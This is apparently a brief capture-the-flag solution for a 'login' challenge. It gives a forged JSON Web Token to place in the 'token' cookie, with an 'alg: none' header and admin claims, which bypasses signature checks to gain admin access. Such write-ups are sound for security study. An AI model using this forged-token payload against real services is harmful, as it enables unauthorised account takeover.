login
=====

set the `token` cookie to:

```
eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiIsInR5cGUiOiJhZG1pbiIsImlhdCI6MCwiZXhwIjozMDAwMDAwMDAwfQ.
```

which is made up of
```
Header:
{
  "alg": "none"
}

Payload:
{
  "sub": "admin",
  "type": "admin",
  "iat": 0,
  "exp": 3000000000
}
```
